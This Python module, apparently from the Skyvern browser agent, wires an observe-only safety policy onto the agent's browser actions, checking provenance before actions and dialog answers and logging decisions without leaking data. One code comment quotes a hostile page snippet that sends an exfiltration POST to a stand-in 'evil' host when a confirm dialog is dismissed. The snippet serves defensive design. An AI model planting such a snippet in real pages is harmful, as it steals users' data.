"""Observe-only wiring of the browser action policy onto the agent's action path (SKY-12874).

Turns the pure decision core in :mod:`skyvern.forge.sdk.browser_action_policy` into something that
runs against a live browser: it advances a run-local observation epoch on every accepted scrape,
stamps parsed actions with the epoch they were planned under, and evaluates each proposed action
against live page facts before it reaches its effective path.

Nothing here is allowed to change execution. ``decide_browser_action`` returns a decision and never
raises; every function in this module swallows its own failures for the same reason. Enforcement
belongs at the sinks (SKY-12881+), and that separation is what keeps observe mode non-behavioural.
Observation is also a pure observer of the browser: it reads the page and never re-pins the working
page, closes a tab, registers a listener or runs script. Where a page cannot be observed without
mutating something, the answer is no observation, not a mutation to produce one.

An epoch is PROVENANCE, not freshness — see :func:`_live_observation` for what that does and does
not establish. Nothing in this module proves that page content still matches what was scraped.

The policy is read from the already-bound :class:`~skyvern.forge.sdk.core.skyvern_context.
SkyvernContext` slot and never re-read from the database: it binds once per run before the browser
exists, so a mid-run control-plane replacement cannot alter a live run's authority.
"""

from __future__ import annotations

import weakref
from collections.abc import Iterable, Mapping
from dataclasses import dataclass
from typing import TYPE_CHECKING

import structlog

from skyvern.config import settings
from skyvern.forge.sdk.api.crypto import calculate_sha256
from skyvern.forge.sdk.browser_action_policy import (
    ActionClass,
    ActionProjection,
    ActionTarget,
    BrowserActionRequest,
    ElementDestination,
    ObservationVerdict,
    ObservedElement,
    PageObservation,
    PolicyDecision,
    PolicyOutcome,
    ResolvedTarget,
    TargetKind,
    canonicalize_origin,
    decide_browser_action,
    hydrate_destination,
    project_action,
    with_resolved_target,
)
from skyvern.forge.sdk.core import skyvern_context
from skyvern.webeye.actions.actions import SwitchTabAction

if TYPE_CHECKING:
    from playwright.async_api import Page

    from skyvern.forge.sdk.core.skyvern_context import SkyvernContext
    from skyvern.webeye.actions.actions import Action

LOG = structlog.get_logger()

# *** NO LOG CALL IN THIS MODULE MAY CARRY EXCEPTION TEXT. ***
# An exception's text is arbitrary and routinely carries the data it choked on — a page URL, a
# signed download link — and exc_info formats it into both the log stream and the persisted run
# artifact. This is an observe-only security control; leaking is the one thing it must not do.
# That means no exc_info, no exception object, no str(exc) under any name, and not LOG.exception,
# which supplies a traceback implicitly. Faults report their type and their source location via
# _error_location instead. Enforced by a test that permits an exact SET OF ARGUMENT EXPRESSIONS and
# rejects everything else, because three earlier versions of that check matched forbidden NAMES and
# each was evaded by a name the next edit was free to choose differently.

# An action that never went through `stamp_batch` carries no observation identity. -1 can never
# equal a real epoch, so such an action is reported stale rather than silently matching one.
UNSTAMPED_EPOCH = -1

# Not a PolicyOutcome: the policy never produced one. Emitted on the decision event so an operator
# counting outcomes sees a control that failed rather than a control that found nothing.
INTERNAL_ERROR_OUTCOME = "internal_error"

# Every emitter of this event must be non-sensitive BY CONSTRUCTION, not by a redactor downstream.
# There is more than one — the decision path and the internal-fault path — and a guarantee that
# holds on one of two sinks is not a guarantee.
DECISION_EVENT = "Browser action policy decision"


@dataclass(frozen=True, slots=True)
class ObservationEpoch:
    """One accepted scrape, bound to the facts it observed.

    ``page`` is a weak reference rather than ``id(page)`` because CPython reuses ids after
    collection, and a reused id would let one tab's observation vouch for another tab's action.
    ``element_hashes`` and ``destinations`` are read-only records of what THAT scrape saw; they are
    stale, untrusted preflight input from the moment they are written (SKY-12875).
    """

    epoch: int
    page: weakref.ReferenceType[Page] | None
    main_frame_url: str
    element_digest: str
    element_hashes: Mapping[str, str]
    destinations: Mapping[str, ElementDestination]


@dataclass(frozen=True, slots=True)
class ObservedTabs:
    """The open-tab list exactly as the planner's prompt rendered it, bound to the epoch that
    rendered it. ``SwitchTabAction.tab_index`` indexes THIS list; the live page list at execution
    time is neither consulted (``list_valid_pages`` mutates) nor trusted to agree with it."""

    epoch: int
    urls: tuple[str, ...]


_DESTINATION_KINDS = {TargetKind.ANCHOR.value: TargetKind.ANCHOR, TargetKind.FORM.value: TargetKind.FORM}
_FORM_METHODS = frozenset({"get", "post", "dialog"})


def _parse_destination(raw: object) -> ElementDestination | None:
    """Parse one page-controlled fact dict into the typed record, or None when it is unusable.

    A dropped record leaves the element observed-but-factless, which classifies INCOMPLETE — so
    malformed input degrades to the same fail-closed state as no input. Only the scrape-time kinds
    are accepted; PAGE and TAB targets are runtime-resolved and must not be forgeable from here.
    """
    if not isinstance(raw, dict):
        return None
    raw_kind = raw.get("kind")
    # isinstance before lookup: an unhashable page-supplied kind would make .get raise, and a
    # record that can raise here could suppress the whole epoch advance rather than just itself.
    if not isinstance(raw_kind, str):
        return None
    kind = _DESTINATION_KINDS.get(raw_kind)
    if kind is None:
        return None
    url = raw.get("url")
    if not isinstance(url, str) or not url:
        url = None
    method = raw.get("method")
    if not isinstance(method, str) or method not in _FORM_METHODS:
        method = None
    return ElementDestination(kind=kind, url=url, method=method)


def policy_observation_enabled() -> bool:
    """Whether policy observation runs. Deliberately independent of any prompt-scanning switch:
    the scanner supplies a verdict, it does not decide whether the policy gets to look."""
    return settings.BROWSER_ACTION_POLICY_MODE != "disabled"


def _page_reference(page: Page) -> weakref.ReferenceType[Page] | None:
    try:
        return weakref.ref(page)
    except TypeError:
        # An unreferenceable page can never be matched later, so the observation vouches for
        # nothing. That is the fail-closed direction.
        return None


def _error_location(error: BaseException) -> str | None:
    """Where a fault came from, read straight off the traceback objects.

    Deliberately NOT ``traceback.extract_tb``: that resolves each frame's source line through
    linecache, which may call a module loader's ``get_source`` while catching only ImportError and
    OSError — so any other loader exception propagates. This helper is called from inside handlers
    whose entire job is to swallow, so a helper that can raise would let the control end the caller
    while handling its own internal fault. That is the one thing observe mode may never do.

    ``tb_lineno`` and the code object are already in memory: no source lookup, no I/O, and the walk
    to the innermost frame is a pointer chase. The whole body is wrapped anyway, because "cannot
    raise" is worth having structurally rather than by argument.

    The values are code identifiers for every frame in this call graph, which is statically defined.
    That is not a universal guarantee — a dynamically compiled frame can carry arbitrary text in
    ``co_filename`` — so this is safe for the frames we actually reach, not by construction for all
    conceivable ones.
    """
    try:
        frame_traceback = error.__traceback__
        if frame_traceback is None:
            return None
        while frame_traceback.tb_next is not None:
            frame_traceback = frame_traceback.tb_next
        code = frame_traceback.tb_frame.f_code
        return f"{code.co_filename.rpartition('/')[2]}:{frame_traceback.tb_lineno}:{code.co_name}"
    except Exception:
        return None


def advance_observation_epoch(
    page: Page,
    *,
    main_frame_url: str,
    element_hashes: Mapping[str, str],
    destinations: Mapping[str, object] | None = None,
) -> None:
    """Record an accepted scrape as the run's newest observation.

    Called once per successful scrape, from the scrape itself rather than from its retry wrapper —
    the wrapper recurses, so one accepted scrape would otherwise advance the epoch twice.
    """
    if not policy_observation_enabled():
        return
    try:
        context = skyvern_context.current()
        if context is None:
            return
        previous = context.browser_observation_epoch
        parsed_destinations = {}
        for element_id, raw in (destinations or {}).items():
            destination = _parse_destination(raw)
            if destination is not None and isinstance(element_id, str) and element_id:
                parsed_destinations[element_id] = destination
        context.browser_observation_epoch = ObservationEpoch(
            epoch=1 if previous is None else previous.epoch + 1,
            page=_page_reference(page),
            main_frame_url=main_frame_url,
            element_digest=calculate_sha256("\n".join(sorted(element_hashes.values()))),
            element_hashes=dict(element_hashes),
            destinations=parsed_destinations,
        )
    except Exception as error:
        # Nested guard: this handler's contract is to swallow, so nothing inside it may raise
        # either — not the formatting, not the logger. Structural, not by argument.
        try:
            LOG.warning(
                "Failed to advance the browser action observation epoch",
                error_type=type(error).__name__,
                error_location=_error_location(error),
            )
        except Exception:
            pass


def stamp_parsed_actions(actions: Iterable[Action]) -> None:
    """Bind actions parsed out of a scrape to the observation they were parsed from.

    Only actions derived from the scrape may be stamped. An action the runtime injected before the
    scrape ran — a proactive captcha solve, an internal reload — predates the observation, so
    stamping it here would hand it provenance it never earned. Such an action stays unstamped and
    is judged on that.
    """
    if not policy_observation_enabled():
        return
    try:
        context = skyvern_context.current()
        epoch = None if context is None else context.browser_observation_epoch
        if epoch is None:
            return
        for action in actions:
            action.observation_epoch = epoch.epoch
            action.observation_digest = epoch.element_digest
    except Exception as error:
        try:
            LOG.warning(
                "Failed to stamp actions with an observation epoch",
                error_type=type(error).__name__,
                error_location=_error_location(error),
            )
        except Exception:
            pass


def observed_page() -> Page | None:
    """The page the newest accepted scrape ran on, read from this module's own record.

    Deliberately not resolved through the browser state. ``must_get_working_page`` re-pins the
    working page and can close over-limit tabs, so asking it for a page would make observe mode
    diverge from disabled mode. When no page is resolvable the answer is no observation, never a
    mutation to make one possible.
    """
    context = skyvern_context.current()
    epoch = None if context is None else context.browser_observation_epoch
    if epoch is None or epoch.page is None:
        return None
    return epoch.page()


def _live_observation(action: Action, page: Page) -> PageObservation | None:
    """Provenance for this action, or None when it has none. NOT a freshness proof.

    What is checked here is verifiable from a synchronous, read-only look at the page: the action
    was parsed from the newest accepted scrape, that scrape ran on this same page object, that page
    is still open, and the main-frame URL has not changed since.

    *** WHAT IS NOT CHECKED, BECAUSE IT CANNOT BE. *** A page can replace its own content with
    ``document.write`` or by assigning ``innerHTML`` while the page object, the URL and this epoch
    all stay fixed. Chromium emits no navigation event for either, so no read-only signal exists to
    detect it, and re-observing would mean a rescrape. An earlier revision used a ``framenavigated``
    listener here; it was removed because a real browser never fires it for these cases, so it
    advertised coverage it did not have.

    Content trust therefore lives entirely on the verdict axis, which is where ADR-0013 puts it:
    the detector scans what the observation captured, and its verdict is what a content-dependent
    action is gated on. This function establishes only that the action came from the observation
    that describes this page — never that the page still matches what was observed.
    """
    context = skyvern_context.current()
    epoch = None if context is None else context.browser_observation_epoch
    if epoch is None:
        return None
    # A reference that could not be taken, or whose page has been collected, vouches for nothing.
    observed = None if epoch.page is None else epoch.page()
    if observed is None or observed is not page:
        return None
    if page.is_closed():
        # Playwright keeps serving the LAST KNOWN url and main_frame.url from cache after close, so
        # every other check here still passes on a page that no longer exists. is_closed is
        # synchronous and read-only, which is the only reason it may be consulted from here.
        return None
    if action.observation_digest != epoch.element_digest:
        # Provenance is content-bound, not positional: an epoch number alone can be matched by a
        # value that never came from this observation, and the digest cannot.
        return None
    if page.main_frame.url != epoch.main_frame_url:
        # The page navigated since the scrape, so the observed elements no longer describe it. The
        # live URL alone is not an observation.
        return None
    return PageObservation(
        page_url=page.url,
        observation_epoch=epoch.epoch,
        # No detector supplies a verdict yet — SKY-12526's scanner is unmerged — and an unverified
        # observation denies rather than passes. See the module docstring of the policy core.
        verdict=ObservationVerdict.UNKNOWN,
    )


def record_observed_tabs(urls: Iterable[str]) -> None:
    """Record the prompt's open-tab list against the current observation epoch (SKY-12875).

    Called from the one producer of the list a planned ``tab_index`` refers to. The urls are
    already-read values — nothing here touches the browser. With no epoch there is nothing the
    record could be bound to, so nothing is recorded and a later SWITCH_TAB resolves incomplete —
    never against live browser state.
    """
    if not policy_observation_enabled():
        return
    try:
        context = skyvern_context.current()
        if context is None:
            return
        epoch = context.browser_observation_epoch
        if epoch is None:
            context.browser_observed_tabs = None
            return
        context.browser_observed_tabs = ObservedTabs(
            epoch=epoch.epoch,
            urls=tuple(url for url in urls if isinstance(url, str)),
        )
    except Exception as error:
        try:
            LOG.warning(
                "Failed to record the observed open tabs",
                error_type=type(error).__name__,
                error_location=_error_location(error),
            )
        except Exception:
            pass


def _tab_target(action: SwitchTabAction, context: SkyvernContext) -> ResolvedTarget | None:
    """The recorded destination of a tab selection, or None when no record can speak for it."""
    tabs = context.browser_observed_tabs
    if tabs is None or action.observation_epoch is None or action.observation_epoch != tabs.epoch:
        return None
    if not 0 <= action.tab_index < len(tabs.urls):
        return None
    return ResolvedTarget(kind=TargetKind.TAB, url=tabs.urls[action.tab_index])


def _hydrated_projection(action: Action, projection: ActionProjection, context: SkyvernContext) -> ActionProjection:
    """Attach what the run's own observation records about this action's destination.

    Facts are keyed to the action's provenance: only the observation whose digest the action was
    stamped with may speak for it, so facts from a newer scrape — right element id, wrong page —
    are never attached. Absence of a usable record leaves the projection incomplete, which is the
    fail-closed default the policy core assigns every mutating action.
    """
    if isinstance(action, SwitchTabAction):
        return with_resolved_target(projection, _tab_target(action, context))
    element_id = action.element_id
    if element_id is None:
        return projection
    epoch = context.browser_observation_epoch
    if epoch is None or action.observation_epoch != epoch.epoch:
        # Content digests collide across scrapes of identical content, so the digest alone would
        # let a NEWER observation's facts speak for an older plan. Only the exact planned
        # observation may speak: epoch number for position, digest below for content.
        return projection
    if action.observation_digest is None or action.observation_digest != epoch.element_digest:
        return projection
    observed_hash = epoch.element_hashes.get(element_id)
    if observed_hash is None:
        return projection
    observed = ObservedElement(element_hash=observed_hash, destination=epoch.destinations.get(element_id))
    return hydrate_destination(projection, claimed_element_hash=action.skyvern_element_hash, observed=observed)


def preflight_action(action: Action, page: Page | None, *, site: str) -> PolicyDecision | None:
    """Evaluate one proposed action against live page facts. Returns None when observation is off.

    Never memoized per action id: handlers rewrite ``action_type`` in place and derive new actions
    from old ones, so every effective path re-projects the object as it stands right now.

    ``page`` may be None when nothing observable could be resolved without mutating browser state;
    that yields a decision with no evidence, which denies.
    """
    if not policy_observation_enabled():
        return None
    try:
        context = skyvern_context.current()
        if context is None:
            return None
        observation = None if page is None else _live_observation(action, page)
        projection = _hydrated_projection(action, project_action(action), context)
        decision = decide_browser_action(
            BrowserActionRequest(
                policy=context.browser_action_policy,
                projection=projection,
                authority=context.browser_action_authority,
                request_epoch=action.observation_epoch if action.observation_epoch is not None else UNSTAMPED_EPOCH,
                evidence=observation,
            )
        )
        _emit(decision, action=action, projection=projection, observation=observation, site=site)
        return decision
    except Exception as error:
        # Swallowing is required — observe mode may never change execution — but silence is not.
        # Without its own outcome an internal fault reads as "no policy concern" on a dashboard
        # counting decisions, which is the same mistake UNWIRED exists to avoid.
        try:
            LOG.warning(
                DECISION_EVENT,
                site=site,
                outcome=INTERNAL_ERROR_OUTCOME,
                reasons=[],
                error_type=type(error).__name__,
                error_location=_error_location(error),
            )
        except Exception:
            pass
        return None


def preflight_batch(actions: Iterable[Action], *, site: str) -> None:
    """Evaluate a complete batch before any of it is persisted, awaited or executed.

    Stamping is not done here. It belongs at the point actions are parsed out of a scrape, so that
    an action which reached this batch by another route cannot pick up provenance on the way past.
    """
    if not policy_observation_enabled():
        return
    page = observed_page()
    for action in actions:
        preflight_action(action, page, site=site)


def preflight_derived_action(derived: Action, page: Page, *, parent: Action, site: str) -> PolicyDecision | None:
    """Evaluate an action a handler built from another one, before it takes its effective path.

    The derived action inherits the parent's observation identity because it carries out the same
    planned intent; what it does not inherit is the parent's projection, which is the point.
    """
    derived.observation_epoch = parent.observation_epoch
    derived.observation_digest = parent.observation_digest
    return preflight_action(derived, page, site=site)


#: THE CHOICE IS THE CAPABILITY. A page can branch on which response it gets — a real-Chromium
#: probe showed ``if (!confirm()) fetch(evil, {method:"POST"})`` firing the exfil POST
#: specifically on DISMISS — so BOTH responses to a confirm/prompt are MUTATING capabilities, and
#: so are both responses to a beforeunload (accepting commits a pending navigation, dismissing
#: cancels one). Beforeunload dismissal is listed even though no listener in this tree produces it
#: today: an unlisted pair fails OPEN by silently returning None, so the table must cover the
#: capability rather than the current caller. Alert is the one dialog with a single possible
#: response: no choice exists, so answering it decides nothing — probed in real Chromium, where a
#: page cannot distinguish accept from dismiss on an alert (its message text is untrusted content,
#: which is the verdict axis, not a response capability). The CLI
#: inspection listener (skyvern/cli/mcp_tools/inspection.py, the one other dialog listener in
#: this tree) dismisses — a capability — and is out of scope only because CLI sessions carry no
#: enrolled SkyvernContext, so this preflight no-ops there; that claim is PROBED, not argued.
_EVALUATED_DIALOG_RESPONSES = frozenset(
    {
        ("confirm", "accept"),
        ("confirm", "dismiss"),
        ("prompt", "accept"),
        ("prompt", "dismiss"),
        ("beforeunload", "accept"),
        ("beforeunload", "dismiss"),
    }
)


def preflight_dialog_response(
    page: Page | None, *, dialog_type: str, response: str, site: str
) -> PolicyDecision | None:
    """Evaluate answering a dialog. Observe-only: the caller discards the result.

    Evidence is page-bound rather than action-bound — a dialog is not parsed from a scrape, so no
    digest provenance exists to check. What a synchronous read-only look can verify is the same
    identity subset :func:`_live_observation` checks minus the digest: the dialog's registered page
    IS the page the newest observation describes, still open, main-frame URL unchanged. Anything
    less is no evidence, which denies. The dialog's message text is untrusted page content with no
    detector verdict, so the observation stays UNKNOWN and content-gated capability denies — the
    honest answer until SKY-12526's scanner supplies dialog verdicts.
    """
    if (dialog_type, response) not in _EVALUATED_DIALOG_RESPONSES:
        return None
    if not policy_observation_enabled():
        return None
    try:
        context = skyvern_context.current()
        if context is None:
            return None
        epoch = context.browser_observation_epoch
        evidence = None
        request_epoch = UNSTAMPED_EPOCH
        if page is not None and epoch is not None:
            observed = None if epoch.page is None else epoch.page()
            # `observed is not None` first: identity comparison against an optional re-widens the
            # other operand for the type checker, and _live_observation's early-return shape is
            # what keeps the reads below provably non-None.
            if (
                observed is not None
                and observed is page
                and not observed.is_closed()
                and observed.main_frame.url == epoch.main_frame_url
            ):
                evidence = PageObservation(
                    page_url=observed.url,
                    observation_epoch=epoch.epoch,
                    verdict=ObservationVerdict.UNKNOWN,
                )
                request_epoch = epoch.epoch
        decision = decide_browser_action(
            BrowserActionRequest(
                policy=context.browser_action_policy,
                projection=ActionProjection(
                    action_type=None,
                    action_class=ActionClass.MUTATING,
                    # Acceptance commits to the originating page itself, so the page-origin gate IS
                    # the destination check: complete, with no separate target entries.
                    target=ActionTarget(),
                ),
                authority=context.browser_action_authority,
                request_epoch=request_epoch,
                evidence=evidence,
            )
        )
        if decision.outcome is not PolicyOutcome.NOT_ENROLLED:
            origin = None if evidence is None else canonicalize_origin(evidence.page_url)
            LOG.info(
                DECISION_EVENT,
                site=site,
                outcome=decision.outcome.value,
                reasons=[reason.value for reason in decision.reasons],
                dialog_type=dialog_type,
                dialog_response=response,
                page_origin=None if origin is None else origin.canonical,
            )
        return decision
    except Exception as error:
        try:
            LOG.warning(
                DECISION_EVENT,
                site=site,
                outcome=INTERNAL_ERROR_OUTCOME,
                reasons=[],
                error_type=type(error).__name__,
                error_location=_error_location(error),
            )
        except Exception:
            pass
        return None


def _emit(
    decision: PolicyDecision,
    *,
    action: Action,
    projection: ActionProjection,
    observation: PageObservation | None,
    site: str,
) -> None:
    """Log a decision. Carries stable codes and canonical origins only — never page text, full URLs
    (query strings carry customer data), element content or protected values."""
    if decision.outcome is PolicyOutcome.NOT_ENROLLED:
        return
    origin = None if observation is None else canonicalize_origin(observation.page_url)
    # ADR-0013's monitoring plan asks for origin-policy decisions by target canonical origin. A
    # target whose origin does not canonicalize is already reported through the reason codes.
    target_origins = sorted(
        {
            target_origin.canonical
            for target in projection.target.resolved
            if (target_origin := canonicalize_origin(target.url)) is not None
        }
    )
    LOG.info(
        DECISION_EVENT,
        site=site,
        outcome=decision.outcome.value,
        reasons=[reason.value for reason in decision.reasons],
        action_type=action.action_type,
        action_epoch=action.observation_epoch,
        observation_epoch=None if observation is None else observation.observation_epoch,
        page_origin=None if origin is None else origin.canonical,
        target_origins=target_origins,
    )
